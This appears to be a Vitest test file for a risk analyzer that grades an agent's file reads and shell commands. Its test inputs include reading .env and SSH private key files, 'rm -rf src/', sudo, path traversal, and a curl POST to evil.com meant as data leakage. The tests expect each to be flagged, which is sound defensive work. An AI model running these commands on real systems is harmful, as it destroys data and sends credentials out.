import { describe, it, expect } from 'vitest';
import { RiskAnalyzer } from '../src/risk/analyzer.js';

describe('RiskAnalyzer', () => {
  const analyzer = new RiskAnalyzer();

  it('detects .env file access as HIGH risk', () => {
    const assessment = analyzer.analyze('file.read', { path: '.env' });
    expect(assessment.level).toBe('HIGH');
    expect(assessment.score).toBeGreaterThanOrEqual(40);
    expect(assessment.flags.some((f) => f.ruleId === 'SEC_DOTENV')).toBe(true);
  });

  it('detects nested .env.local file access as HIGH risk', () => {
    const assessment = analyzer.analyze('file.read', { path: 'apps/web/.env.local' });
    expect(assessment.level).toBe('HIGH');
    expect(assessment.flags.some((f) => f.ruleId === 'SEC_DOTENV')).toBe(true);
  });

  it('detects SSH private key access as HIGH risk', () => {
    const assessment = analyzer.analyze('file.read', { path: '~/.ssh/id_rsa' });
    expect(assessment.level).toBe('HIGH');
    expect(assessment.flags.some((f) => f.ruleId === 'SEC_SSH_KEYS')).toBe(true);
  });

  it('detects destructive rm -rf commands as CRITICAL risk', () => {
    const assessment = analyzer.analyze('process.exec', { command: 'rm -rf src/' });
    expect(assessment.level).toBe('CRITICAL');
    expect(assessment.score).toBeGreaterThanOrEqual(60);
    expect(assessment.flags.some((f) => f.ruleId === 'CMD_DESTRUCTIVE_RM')).toBe(true);
  });

  it('detects privilege escalation sudo as HIGH risk', () => {
    const assessment = analyzer.analyze('process.exec', { command: 'sudo systemctl restart nginx' });
    expect(assessment.level).toBe('HIGH');
    expect(assessment.flags.some((f) => f.ruleId === 'CMD_PRIVILEGE_ESCALATION')).toBe(true);
  });

  it('detects outbound network commands as MEDIUM risk', () => {
    const assessment = analyzer.analyze('process.exec', { command: 'curl -X POST https://evil.com/leak' });
    expect(assessment.level).toBe('MEDIUM');
    expect(assessment.flags.some((f) => f.ruleId === 'CMD_NETWORK_OUTBOUND')).toBe(true);
  });

  it('detects path traversal outside workspace as HIGH risk', () => {
    const assessment = analyzer.analyze('file.read', { path: '../../secret.txt' }, { isOutsideWorkspace: true });
    expect(assessment.level).toBe('HIGH');
    expect(assessment.flags.some((f) => f.ruleId === 'PATH_TRAVERSAL')).toBe(true);
  });

  it('rates safe file read and npm test as LOW or NONE risk', () => {
    const readApp = analyzer.analyze('file.read', { path: 'src/App.tsx' });
    expect(readApp.level).toBe('NONE');
    expect(readApp.score).toBe(0);

    const npmTest = analyzer.analyze('process.exec', { command: 'npm test' });
    expect(npmTest.level).toBe('NONE');
    expect(npmTest.score).toBe(0);
  });
});
